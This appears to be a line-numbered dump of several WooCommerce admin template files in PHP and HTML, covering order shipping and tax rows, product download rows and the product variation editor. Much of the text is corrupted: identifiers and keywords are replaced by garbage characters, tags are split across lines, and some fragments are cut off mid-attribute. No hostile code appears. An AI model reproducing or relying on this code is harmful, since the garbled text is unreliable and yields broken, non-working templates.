="<?php if ( isset( $item['line_subtotal_tax'] ) )ƒchoƒsc_attr( wc_format_localized_price( $item['line_subtotal_tax'] ) ); ?>" class="line_subtotal_tax wc_input_price" /></span>

194 <
šput
 
ty³
="‹xt" 
Çme
="lše_x[<?ph°echØabsštĞ$™em_id ); ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?ph°iàĞis£tĞ$™em['lše_x'] ) )ƒchØesc_©ŒĞwc_fÜm©_loÿlized_´iûĞ$™em['lše_x'] ) ); ?>" 
şass
="line_tax wc_input_price" />

195 </
div
>

196 </
td
>

198 <?
php
 
’dif
; ?>

200 <
	gtd
>

201 <
a
 
	gşass
="ed™_Üd”_™em" 
h»f
="#"><
img
 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/icÚs/ed™.²g" 
®t
="Ed™" 
width
="14" /></a>

202 </
td
>

204 </
Œ
>

	@includes/admin/post-types/meta-boxes/views/html-order-shipping.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gşass
="tÙ®_row shpšg_row" 
d©a
-
Üd”_™em_id
="<?phpƒcho $item_id; ?>">

5 <
p
 
şass
="wide">

6 <
šput
 
ty³
="‹xt" 
Çme
="shpšg_m‘hod_t™Ë[<?ph°echØ$™em_id ? $™em_id : 'Ãw][]'; ?>]" 
¶aûhŞd”
="<?ph°_eĞ'Lab–', 'woocomm”û' ); ?>" 
v®ue
="<?ph°echØesc_©ŒĞ$shpšg_t™Ë ); ?>" 
şass
="first" />

7 <
šput
 
ty³
="hidd’" 
Çme
="shpšg_m‘hod_id[<?ph°echØ$™em_id ? $™em_id : 'Ãw][]'; ?>]" 
v®ue
="<?phpƒchoƒsc_attr( $item_id ); ?>" />

8 </
p
>

9 <
p
 
şass
="first">

10 <
£Ëù
 
Çme
="shpšg_m‘hod[<?ph°echØ$™em_id ? $™em_id : 'Ãw][]'; ?>]" 
şass
="first">

11 <
İtgroup
 
Ïb–
="<?php _e( 'Shipping Method', 'woocommerce' ); ?>">

12 <
İtiÚ
 
v®ue
=""><?
php
 
_e
Ğ'N/A', 'woocomm”û' ); ?></
	gİtiÚ
>

13 <?
php


14 
	g$found_m‘hod
 = 
çl£
;

16 
	$fÜ—ch
 ( 
$shpšg_m‘hods
 
as
 
$m‘hod
 ) {

18 iàĞ
	`¡½os
Ğ
$cho£n_m‘hod
, 
$m‘hod
->
id
 ) === 0 )

19 
$v®ue
 = 
$cho£n_m‘hod
;

21 
$v®ue
 = 
$m‘hod
->
id
;

23 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$v®ue
 ) . '" ' . 
	`£Ëùed
Ğ
$cho£n_m‘hod
 =ğ$v®ue, 
Œue
, 
çl£
 ) . '>' . 
	`esc_html
Ğ
$m‘hod
->
	`g‘_t™Ë
() ) . '</option>';

25 iàĞ
$cho£n_m‘hod
 =ğ
$v®ue
 )

26 
$found_m‘hod
 = 
Œue
;

27 
	}
}

29 iàĞ! 
	g$found_m‘hod
 && ! 
	$em±y
Ğ
$cho£n_m‘hod
 ) ) {

30 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$cho£n_m‘hod
 ) . '" s–eùed="£Ëùed">' . 
	`__
( 'Other', 'woocommerce' ) . '</option>';

31 
	}
} {

32 
	gecho
 '<İtiÚ v®ue="Ùh”">' . 
__
( 'Other', 'woocommerce' ) . '</option>';

35 </
	gİtgroup
>

36 </
	g£Ëù
>

37 </
	gp
>

38 <
p
 
	gşass
="last">

39 <
šput
 
ty³
="‹xt" 
şass
="shpšg_co¡ wc_šput_´iû" 
Çme
="shpšg_co¡[<?ph°echØ$™em_id ? $™em_id : 'Ãw][]'; ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?phpƒchoƒsc_attr( wc_format_localized_price( $shipping_cost ) ); ?>" />

40 </
p
>

41 <?
php
 
do_aùiÚ
Ğ'woocomm”û_admš_Üd”_tÙ®s_aá”_shpšg_™em', 
$™em_id
 ); ?>

42 <
a
 
	gh»f
="#" 
şass
="d–‘e_tÙ®_row">&
times
;</
	ga
>

43 <
div
 
	gşass
="clear"></div>

44 </
div
>

	@includes/admin/post-types/meta-boxes/views/html-order-tax.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gşass
="tÙ®_rowax_row" 
d©a
-
Üd”_™em_id
="<?phpƒcho $item_id; ?>">

5 <
p
 
şass
="wide">

6 <
£Ëù
 
Çme
="order_taxes_rate_id[<?phpƒcho $item_id ? $item_id : 'new][]'; ?>]">

7 <
İtgroup
 
Ïb–
="<?php _e( 'Tax Rate', 'woocommerce' ); ?>">

8 <
İtiÚ
 
v®ue
=""><?
php
 
_e
Ğ'N/A', 'woocomm”û' ); ?></
	gİtiÚ
>

9 <?
php
 
fÜ—ch
Ğ
$x_codes
 
as
 
$x_id
 => 
$x_code
 ) : ?>

10 <
İtiÚ
 
v®ue
="<?ph°echØ$x_id; ?>" <?
php
 
£Ëùed
Ğ
$x_id
, 
is£t
Ğ
$™em
['¿‹_id'] ) ? $™em['¿‹_id'] : '' ); ?>><?ph°
echo
 
esc_html
Ğ
u¾decode
Ğ
$x_code
 ) ); ?></
	gİtiÚ
>

11 <?
php
 
	g’dfÜ—ch
; ?>

12 </
	gİtgroup
>

13 </
	g£Ëù
>

14 <
šput
 
	gty³
="hidd’" 
Çme
="Üd”_xes_id[<?ph°echØ$™em_id ? $™em_id : 'Ãw][]'; ?>]" 
v®ue
="<?phpƒchoƒsc_attr( $item_id ); ?>" />

15 </
p
>

16 <
p
 
şass
="first">

17 <
Ïb–
><?
php
 
_e
Ğ'S®e Tax', 'woocomm”û' ) ?></
	gÏb–
>

18 <
šput
 
	gty³
="‹xt" 
şass
="Üd”_xes_amouÁ wc_šput_´iû" 
Çme
="Üd”_xes_amouÁ[<?ph°echØ$™em_id ? $™em_id : 'Ãw][]'; ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?php if ( isset( $item['tax_amount'] ) )ƒchoƒsc_attr( wc_format_localized_price( $item['tax_amount'] ) ); ?>" />

19 </
p
>

20 <
p
 
şass
="last">

21 <
Ïb–
><?
php
 
_e
Ğ'Shpšg Tax', 'woocomm”û' ) ?></
	gÏb–
>

22 <
šput
 
	gty³
="‹xt" 
şass
="Üd”_xes_shpšg_amouÁ wc_šput_´iû" 
Çme
="Üd”_xes_shpšg_amouÁ[<?ph°echØ$™em_id ? $™em_id : 'Ãw][]'; ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?php if ( isset( $item['shipping_tax_amount'] ) )ƒchoƒsc_attr( wc_format_localized_price( $item['shipping_tax_amount'] ) ); ?>" />

23 </
p
>

24 <
a
 
h»f
="#" 
şass
="d–‘e_tÙ®_row">&
times
;</
	ga
>

25 <
div
 
	gşass
="clear"></div>

26 </
div
>

	@includes/admin/post-types/meta-boxes/views/html-product-download.php

1 <
	gŒ
>

2 <
td
 
	gşass
="sort"></td>

3 <
td
 
şass
="fe_Çme"><
šput
 
ty³
="‹xt" cÏss="šput_‹xt" 
¶aûhŞd”
="<?ph°_eĞ'FName', 'woocomm”û' ); ?>" 
Çme
="_wc_fe_Çmes[]" 
v®ue
="<?phpƒchoƒsc_attr( $file['name'] ); ?>" /></td>

4 <
td
 
şass
="fe_u¾"><
šput
 
ty³
="‹xt" cÏss="šput_‹xt" 
¶aûhŞd”
="<?ph°_eĞ"
h‰p
:

5 <
td
 
şass
="fe_u¾_choo£" 
width
="1%"><
a
 
h»f
="#" cÏss="bu‰Ú u¶ßd_fe_bu‰Ú" 
d©a
-
choo£
="<?ph°_eĞ'Choo£ fe', 'woocomm”û' ); ?>" d©a-
upd©e
="<?ph°_eĞ'In£¹ fURL', 'woocomm”û' ); ?>"><?
php
 
echo
 
¡r_»¶aû
Ğ' ', '&nb¥;', 
__
Ğ'Choo£ fe', 'woocomm”û' ) ); ?></
	ga
></
	gtd
>

6 <
td
 
	gwidth
="1%"><
a
 
h»f
="#" 
şass
="d–‘e"><?
php
 
_e
Ğ'D–‘e', 'woocomm”û' ); ?></
	ga
></
	gtd
>

7 </
	gŒ
>

	@includes/admin/post-types/meta-boxes/views/html-product-variation-download.php

1 <
	gŒ
>

2 <
td
 
	gşass
="fe_Çme"><
šput
 
ty³
="‹xt" 
şass
="šput_‹xt" 
¶aûhŞd”
="<?ph°_eĞ'FName', 'woocomm”û' ); ?>" 
Çme
="_wc_v¬ŸtiÚ_fe_Çmes[<?ph°echØ$v¬ŸtiÚ_id; ?>][]" 
v®ue
="<?phpƒchoƒsc_attr( $file['name'] ); ?>" /></td>

3 <
td
 
şass
="fe_u¾"><
šput
 
ty³
="‹xt" cÏss="šput_‹xt" 
¶aûhŞd”
="<?ph°_eĞ"
h‰p
:

4 <
td
 
şass
="fe_u¾_choo£" 
width
="1%"><
a
 
h»f
="#" cÏss="bu‰Ú u¶ßd_fe_bu‰Ú" 
d©a
-
choo£
="<?ph°_eĞ'Choo£ fe', 'woocomm”û' ); ?>" d©a-
upd©e
="<?ph°_eĞ'In£¹ fURL', 'woocomm”û' ); ?>"><?
php
 
echo
 
¡r_»¶aû
Ğ' ', '&nb¥;', 
__
Ğ'Choo£ fe', 'woocomm”û' ) ); ?></
	ga
></
	gtd
>

5 <
td
 
	gwidth
="1%"><
a
 
h»f
="#" 
şass
="d–‘e"><?
php
 
_e
Ğ'D–‘e', 'woocomm”û' ); ?></
	ga
></
	gtd
>

6 </
	gŒ
>

	@includes/admin/post-types/meta-boxes/views/html-variation-admin.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gşass
="woocommerce_variation wc-metabox closed">

5 <
h3
>

6 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="»move_v¬ŸtiÚ bu‰Ú" 
»l
="<?ph°echØesc_©ŒĞ$v¬ŸtiÚ_id ); ?>"><?
php
 
_e
Ğ'Remove', 'woocomm”û' ); ?></
	gbu‰Ú
>

7 <
div
 
	gşass
="hªdËdiv" 
t™Ë
="<?php _e( 'Clickooggle', 'woocommerce' ); ?>"></div>

8 <
¡rÚg
>#<?
php
 
echo
 
esc_html
Ğ
$v¬ŸtiÚ_id
 ); ?> &
	gmdash
; </
	g¡rÚg
>

9 <?
php


10 
fÜ—ch
 ( 
$·»Á_d©a
['©Œibu‹s'] 
as
 
$©Œibu‹
 ) {

13 iàĞ! 
	g$©Œibu‹
['is_variation'] ) {

18 
	g$v¬ŸtiÚ_£Ëùed_v®ue
 = 
is£t
Ğ
$v¬ŸtiÚ_d©a
[ '©Œibu‹_' . 
§n™ize_t™Ë
Ğ
$©Œibu‹
['name'] ) ][0] ) ? $variation_data[ 'attribute_' . sanitize_title( $attribute['name'] ) ][0] : '';

21 
	gecho
 '<£Ëù‚ame="©Œibu‹_' . 
§n™ize_t™Ë
Ğ
$©Œibu‹
['Çme'] ) . '[' . 
	g$loİ
 . ']"><İtiÚ v®ue="">' . 
__
Ğ'Any', 'woocomm”û' ) . ' ' . 
esc_html
Ğ
wc_©Œibu‹_Ïb–
( $attribute['name'] ) ) . '&hellip;</option>';

24 iàĞ
	g$©Œibu‹
['is_taxonomy'] ) {

26 
	g$po¡_‹rms
 = 
wp_g‘_po¡_‹rms
Ğ
$·»Á_d©a
['id'], 
$©Œibu‹
['name'] );

28 
fÜ—ch
 ( 
$po¡_‹rms
 
as
 
$‹rm
 ) {

29 
	gecho
 '<İtiÚ ' . 
£Ëùed
Ğ
$v¬ŸtiÚ_£Ëùed_v®ue
, 
$‹rm
->
¦ug
, 
çl£
 ) . ' v®ue="' . 
esc_©Œ
Ğ$‹rm->¦ug ) . '">' . 
­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_İtiÚ_Çme', 
esc_html
Ğ$‹rm->
Çme
 ) ) . '</option>';

34 
	g$İtiÚs
 = 
¬¿y_m­
Ğ'Œim', 
ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹
['value'] ) );

36 
fÜ—ch
 ( 
$İtiÚs
 
as
 
$İtiÚ
 ) {

37 
	gecho
 '<İtiÚ ' . 
£Ëùed
Ğ
§n™ize_t™Ë
Ğ
$v¬ŸtiÚ_£Ëùed_v®ue
 ), sª™ize_t™ËĞ
$İtiÚ
 ), 
çl£
 ) . ' v®ue="' . 
esc_©Œ
Ğ§n™ize_t™ËĞ$İtiÚ ) ) . '">' . 
esc_html
Ğ
­¶y_f‹rs
( 'woocommerce_variation_option_name', $option ) ) . '</option>';

42 
	gecho
 '</select>';

45 <
šput
 
	gty³
="hidd’" 
Çme
="v¬ŸbË_po¡_id[<?ph°echØ$loİ; ?>]" 
v®ue
="<?phpƒchoƒsc_attr( $variation_id ); ?>" />

46 <
šput
 
ty³
="hidd’" 
şass
="v¬ŸtiÚ_m’u_Üd”" 
Çme
="v¬ŸtiÚ_m’u_Üd”[<?ph°echØ$loİ; ?>]" 
v®ue
="<?phpƒcho $loop; ?>" />

47 </
h3
>

48 <
bË
 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
şass
="woocommerce_variable_attributes wc-metabox-content">

49 <
tbody
>

50 <
Œ
>

51 <
td
 
şass
="sku" 
cŞ¥ª
="2">

52 <?
php
 iàĞ
	$wc_´oduù_sku_’abËd
() ) : ?>

53 <
Ïb–
><?
php
 
	`_e
Ğ'SKU', 'woocomm”û' ); ?>: <
a
 
şass
="ts" 
d©a
-
t
="<?ph°_eĞ'EÁ”‡ SKU fÜhi v¬ŸtiÚ o¸ËavbÏnkØu£h·»Á…roduù SKU.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></label>

54 <
šput
 
ty³
="‹xt" 
size
="5" 
Çme
="v¬ŸbË_sku[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_sku ) )ƒchØesc_©ŒĞ$_sku ); ?>" 
¶aûhŞd”
="<?phpƒchoƒsc_attr( $parent_data['sku'] ); ?>" />

55 <?
php
 : ?>

56 <
šput
 
ty³
="hidd’" 
Çme
="v¬ŸbË_sku[<?ph°echØ$loİ; ?>]" 
v®ue
="<?php if ( isset( $_sku ) )ƒchoƒsc_attr( $_sku ); ?>" />

57 <?
php
 
’dif
; ?>

58 </
td
>

59 <
td
 
şass
="d©a" 
row¥ª
="2">

60 <
bË
 
ûÎ¥acšg
="0" 
ûÎ·ddšg
="0" 
şass
="data_table">

61 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_manage_stock' ) == 'yes' ) : ?>

62 <
Œ
>

63 <
td
>

64 <
Ïb–
><?
php
 
	`_e
Ğ'Stock Qty:', 'woocomm”û' ); ?> <
a
 
şass
="ts" 
d©a
-
t
="<?ph°_eĞ'EÁ”‡ quªt™yØ’abË stock mªagem’ˆ© v¬ŸtiÚ†ev–, o¸ËavbÏnkØu£h·»Á…roduù\' İtiÚs.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></label>

65 <
šput
 
ty³
="numb”" 
size
="5" 
Çme
="v¬ŸbË_¡ock[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_¡ock ) )ƒchØesc_©ŒĞ$_¡ock ); ?>" 
¡•
="any" />

66 </
td
>

67 <
td
>&
nb¥
;</td>

68 </
Œ
>

69 <?
php
 
’dif
; ?>

71 <
Œ
 
şass
="variable_pricing">

72 <
td
>

73 <
Ïb–
><?
php
 
echo
 
	`__
Ğ'ReguÏ¸Priû:', 'woocomm”û' ) . ' (' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
() . ')'; ?></label>

74 <
šput
 
ty³
="‹xt" 
size
="5" 
Çme
="v¬ŸbË_»guÏr_´iû[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_»guÏr_´iû ) )ƒchØesc_©ŒĞ$_»guÏr_´iû ); ?>" 
şass
="wc_šput_´iû" 
¶aûhŞd”
="<?php _e( 'Variation…rice (required)', 'woocommerce' ); ?>" />

75 </
td
>

76 <
td
>

77 <
Ïb–
><?
php
 
echo
 
	`__
Ğ'S®Priû:', 'woocomm”û' ) . ' (' . 
	`g‘_woocomm”û_cu¼’cy_symbŞ
(è. ')'; ?> <
a
 
h»f
="#" 
şass
="§Ë_scheduË"><?ph°
	`_e
Ğ'ScheduË', 'woocomm”û' ); ?></a><¨h»f="#" cÏss="ÿnûl_§Ë_scheduË" 
¡yË
="display:none"><?php _e( 'Cancel schedule', 'woocommerce' ); ?></a></label>

78 <
šput
 
ty³
="‹xt" 
size
="5" 
Çme
="v¬ŸbË_§Ë_´iû[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_§Ë_´iû ) )ƒchØesc_©ŒĞ$_§Ë_´iû ); ?>" 
şass
="wc_input_price" />

79 </
td
>

80 </
Œ
>

82 <
Œ
 
şass
="§Ë_´iû_d©es_f›lds" 
¡yË
="display:none">

83 <
td
>

84 <
Ïb–
><?
php
 
	`_e
( 'Sale start date:', 'woocommerce' ) ?></label>

85 <
šput
 
ty³
="‹xt" 
şass
="§Ë_´iû_d©es_äom" 
Çme
="v¬ŸbË_§Ë_´iû_d©es_äom[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°echØ!ƒm±yĞ$_§Ë_´iû_d©es_äom ) ? d©e_i18nĞ'Y-m-d', $_§Ë_´iû_d©es_äom ) : ''; ?>" 
¶aûhŞd”
="<?ph°echØ_xĞ'From&h–l;', '¶aûhŞd”', 'woocomm”û' ) ?> YYYY-MM-DD" 
maxËngth
="10" 
·‰”n
="[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])" />

86 </
td
>

87 <
td
>

88 <
Ïb–
><?
php
 
	`_e
( 'Saleƒnd date:', 'woocommerce' ) ?></label>

89 <
šput
 
ty³
="‹xt" 
Çme
="v¬ŸbË_§Ë_´iû_d©es_to[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°echØ!ƒm±yĞ$_§Ë_´iû_d©es_tØè? d©e_i18nĞ'Y-m-d', $_§Ë_´iû_d©es_tØè: ''; ?>" 
¶aûhŞd”
="<?ph°echØ_x('To&h–l;', '¶aûhŞd”', 'woocomm”û'è?> YYYY-MM-DD" 
maxËngth
="10" 
·‰”n
="[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])" />

90 </
td
>

91 </
Œ
>

93 <?
php
 iàĞ
	`wc_´oduù_weight_’abËd
(è|| 
	$wc_´oduù_dim’siÚs_’abËd
() ) : ?>

94 <
Œ
>

95 <?
php
 iàĞ
	$wc_´oduù_weight_’abËd
() ) : ?>

96 <
td
 
şass
="hide_if_variation_virtual">

97 <
Ïb–
><?
php
 
echo
 
	`__
Ğ'Weight', 'woocomm”û' ) . ' (' . 
	`esc_html
Ğ
	`g‘_İtiÚ
Ğ'woocomm”û_weight_un™' ) ) . '):'; ?> <
a
 
şass
="ts" 
d©a
-
t
="<?ph°_eĞ'EÁ”‡ weighˆfÜhi v¬ŸtiÚ o¸ËavbÏnkØu£h·»Á…roduù weight.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></label>

98 <
šput
 
ty³
="‹xt" 
size
="5" 
Çme
="v¬ŸbË_weight[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_weighˆèèechØesc_©ŒĞ$_weighˆ); ?>" 
¶aûhŞd”
="<?ph°echØesc_©ŒĞ$·»Á_d©a['weight'] ); ?>" 
şass
="wc_input_decimal" />

99 </
td
>

100 <?
php
 : ?>

101 <
td
>&
nb¥
;</td>

102 <?
php
 
’dif
; ?>

103 <?
php
 iàĞ
	$wc_´oduù_dim’siÚs_’abËd
() ) : ?>

104 <
td
 
şass
="dimensions_field hide_if_variation_virtual">

105 <
Ïb–
 ="´oduù_Ëngth"><?
php
 
echo
 
	`__
Ğ'Dim’siÚ (L&times;W&times;H)', 'woocomm”û' ) . ' (' . 
	`esc_html
Ğ
	`g‘_İtiÚ
( 'woocommerce_dimension_unit' ) ) . '):'; ?></label>

106 <
šput
 
id
="´oduù_Ëngth" 
şass
="šput-‹xˆwc_šput_decim®" 
size
="6" 
ty³
="‹xt" 
Çme
="v¬ŸbË_Ëngth[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_Ëngth ) )ƒchØesc_©ŒĞ$_Ëngth ); ?>" 
¶aûhŞd”
="<?phpƒchoƒsc_attr( $parent_data['length'] ); ?>" />

107 <
šput
 
şass
="šput-‹xˆwc_šput_decim®" 
size
="6" 
ty³
="‹xt" 
Çme
="v¬ŸbË_width[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_width ) )ƒchØesc_©ŒĞ$_width ); ?>" 
¶aûhŞd”
="<?phpƒchoƒsc_attr( $parent_data['width'] ); ?>" />

108 <
šput
 
şass
="šput-‹xˆwc_šput_decim®†a¡" 
size
="6" 
ty³
="‹xt" 
Çme
="v¬ŸbË_height[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_heighˆèèechØesc_©ŒĞ$_heighˆ); ?>" 
¶aûhŞd”
="<?phpƒchoƒsc_attr( $parent_data['height'] ); ?>" />

109 </
td
>

110 <?
php
 : ?>

111 <
td
>&
nb¥
;</td>

112 <?
php
 
’dif
; ?>

113 </
Œ
>

114 <?
php
 
’dif
; ?>

115 <
Œ
>

116 <
td
 
şass
="hide_if_v¬ŸtiÚ_vœtu®"><
Ïb–
><?
php
 
	`_e
( 'Shipping class:', 'woocommerce' ); ?></label> <?php

117 
$¬gs
 = 
	`¬¿y
(

120 'show_İtiÚ_nÚe' => 
	`__
( 'Same‡s…arent', 'woocommerce' ),

121 'Çme' => 'v¬ŸbË_shpšg_şass[' . 
$loİ
 . ']',

123 '£Ëùed' => 
	`is£t
Ğ
$shpšg_şass
 ) ? 
	$esc_©Œ
Ğ
$shpšg_şass
 ) : '',

127 
echo
 
	`wp_drİdown_ÿ‹gÜ›s
Ğ
$¬gs
 );

128 ?></
td
>

129 <
td
>

130 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

131 <
Ïb–
><?
php
 
	`_e
( 'Tax class:', 'woocommerce' ); ?></label>

132 <
£Ëù
 
Çme
="variable_tax_class[<?phpƒcho $loop; ?>]">

133 <
İtiÚ
 
v®ue
="·»Á" <?
php
 
	`£Ëùed
Ğ
	`is_nuÎ
Ğ
$_x_şass
 ), 
Œue
 ); ?>><?ph°
	`_e
( 'Same‡s…arent', 'woocommerce' ); ?></option>

134 <?
php


135 
	`fÜ—ch
 ( 
$·»Á_d©a
['x_şass_İtiÚs'] 
as
 
$key
 => 
$v®ue
 )

136 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
 ) . '" ' . 
	`£Ëùed
Ğ$key ==ğ
$_x_şass
, 
Œue
, 
çl£
 ) . '>' . 
	`esc_html
Ğ
$v®ue
 ) . '</option>';

137 ?></
£Ëù
>

138 <?
php
 
’dif
; ?>

139 </
td
>

140 </
Œ
>

141 <
Œ
 
şass
="show_if_v¬ŸtiÚ_dowÆßdabË" 
¡yË
="display:none">

142 <
td
 
cŞ¥ª
="2">

143 <
div
 
şass
="form-field downloadable_files">

144 <
Ïb–
><?
php
 
	`_e
( 'Downloadable Files', 'woocommerce' ); ?>:</label>

145 <
bË
 
şass
="widefat">

146 <
th—d
>

147 <
Œ
>

148 <
th
><?
php
 
	`_e
Ğ'Name', 'woocomm”û' ); ?> <
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e( 'This ishe‚ame ofhe download shownohe customer.', 'woocommerce' ); ?>">[?]</span></th>

149 <
th
 
cŞ¥ª
="2"><?
php
 
	`_e
Ğ'FURL', 'woocomm”û' ); ?> <
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e( 'This ishe URL or‡bsolute…athohe file which customers will get‡ccesso.', 'woocommerce' ); ?>">[?]</span></th>

150 <
th
>&
nb¥
;</th>

151 </
Œ
>

152 </
th—d
>

153 <
tfoÙ
>

154 <
Œ
>

155 <
th
 
cŞ¥ª
="4">

156 <
a
 
h»f
="#" 
şass
="bu‰Ú in£¹" 
d©a
-
row
="<?php

157 
$fe
 = 
	`¬¿y
(

161 
	`ob_¡¬t
();

162 
	`šşude
( 'html-product-variation-download.php' );

163 
echo
 
	`esc_©Œ
Ğ
	`ob_g‘_ş—n
() );

165 </
th
>

166 </
Œ
>

167 </
tfoÙ
>

168 <
tbody
>

169 <?
php


170 iàĞ
$_dowÆßdabË_fes
 ) {

171 
	`fÜ—ch
 ( 
$_dowÆßdabË_fes
 
as
 
$key
 => 
$fe
 ) {

172 iàĞ! 
	`is_¬¿y
Ğ
$fe
 ) ) {

173 
$fe
 = 
	`¬¿y
(

174 'fe' => 
$fe
,

178 
	`šşude
( 'html-product-variation-download.php' );

180 
	}
}

182 </
	gtbody
>

183 </
	gbË
>

184 </
	gdiv
>

185 </
	gtd
>

186 </
	gŒ
>

187 <
Œ
 
	gşass
="show_if_variation_downloadable">

188 <
td
>

189 <
div
>

190 <
Ïb–
><?
php
 
_e
Ğ'DowÆßd Lim™:', 'woocomm”û' ); ?> <
a
 
	gşass
="ts" 
d©a
-
t
="<?ph°_eĞ'L—vbÏnk fÜ uÆim™ed„e-dowÆßds.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></label>

191 <
šput
 
ty³
="numb”" 
size
="5" 
Çme
="v¬ŸbË_dowÆßd_lim™[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_dowÆßd_lim™ ) )ƒchØesc_©ŒĞ$_dowÆßd_lim™ ); ?>" 
¶aûhŞd”
="<?ph°_eĞ'UÆim™ed', 'woocomm”û' ); ?>" 
¡•
="1" 
mš
="0" />

192 </
div
>

193 </
td
>

194 <
td
>

195 <
div
>

196 <
Ïb–
><?
php
 
_e
Ğ'DowÆßd Expœy:', 'woocomm”û' ); ?> <
a
 
	gşass
="ts" 
d©a
-
t
="<?ph°_eĞ'EÁ”hnumb” oàday befÜ¨dowÆßd†škƒxpœes, o¸ËavbÏnk.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></label>

197 <
šput
 
ty³
="numb”" 
size
="5" 
Çme
="v¬ŸbË_dowÆßd_expœy[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°iàĞis£tĞ$_dowÆßd_expœy ) )ƒchØesc_©ŒĞ$_dowÆßd_expœy ); ?>" 
¶aûhŞd”
="<?ph°_eĞ'UÆim™ed', 'woocomm”û' ); ?>" 
¡•
="1" 
mš
="0" />

198 </
div
>

199 </
td
>

200 </
Œ
>

201 <?
php
 
do_aùiÚ
Ğ'woocomm”û_´oduù_aá”_v¬ŸbË_©Œibu‹s', 
$loİ
, 
$v¬ŸtiÚ_d©a
, 
$v¬ŸtiÚ
 ); ?>

202 </
	gbË
>

203 </
	gtd
>

204 </
	gŒ
>

205 <
	gŒ
>

206 <
td
 
	gşass
="upload_image">

207 <
a
 
h»f
="#" 
şass
="u¶ßd_image_bu‰Ú <?ph°iàĞ$image_id > 0 )ƒchØ'»move'; ?>" 
»l
="<?ph°echØesc_©ŒĞ$v¬ŸtiÚ_id ); ?>"><
img
 
¤c
="<?ph°iàĞ!ƒm±yĞ$imagèèechØesc_©ŒĞ$imag);ƒl£ƒchØesc_©ŒĞwc_¶aûhŞd”_img_¤c(è); ?>" /><
šput
 
ty³
="hidd’" 
Çme
="u¶ßd_image_id[<?ph°echØ$loİ; ?>]" cÏss="u¶ßd_image_id" 
v®ue
="<?ph°echØesc_©ŒĞ$image_id ); ?>" /><
¥ª
 class="overlay"></span></a>

208 </
td
>

209 <
td
 
şass
="options">

210 <
Ïb–
><
šput
 
ty³
="checkbox" 
şass
="checkbox" 
Çme
="v¬ŸbË_’abËd[<?ph°echØ$loİ; ?>]" <?
php
 
checked
Ğ
$v¬ŸtiÚ_po¡_¡©us
, 'publish' ); ?> /> <?ph°
_e
Ğ'EÇbËd', 'woocomm”û' ); ?></
	gÏb–
>

212 <
	gÏb–
><
šput
 
	gty³
="checkbox" 
şass
="checkbox v¬ŸbË_is_dowÆßdabË" 
Çme
="v¬ŸbË_is_dowÆßdabË[<?ph°echØ$loİ; ?>]" <?
php
 
checked
Ğ
is£t
Ğ
$_dowÆßdabË
 ) ? $_dowÆßdabË : '', 'yes' ); ?> /> <?ph°
_e
Ğ'DowÆßdabË', 'woocomm”û' ); ?> <
a
 
	gşass
="ts" 
d©a
-
t
="<?ph°_eĞ'EÇbËhi İtiÚ iàacûs i giv’Ø¨dowÆßdabË fupÚ…urcha£ oà¨´oduù', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></
Ïb–
>

214 <
Ïb–
><
šput
 
ty³
="checkbox" 
şass
="checkbox v¬ŸbË_is_vœtu®" 
Çme
="v¬ŸbË_is_vœtu®[<?ph°echØ$loİ; ?>]" <?
php
 
checked
Ğ
is£t
Ğ
$_vœtu®
 ) ? $_vœtu® : '', 'yes' ); ?> /> <?ph°
_e
Ğ'Vœtu®', 'woocomm”û' ); ?> <
a
 
	gşass
="ts" 
d©a
-
t
="<?ph°_eĞ'EÇbËhi İtiÚ ià¨´oduù i nÙ sh³d o¸th”i nØshpšg co¡', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a></label>

216 <?
php
 
do_aùiÚ
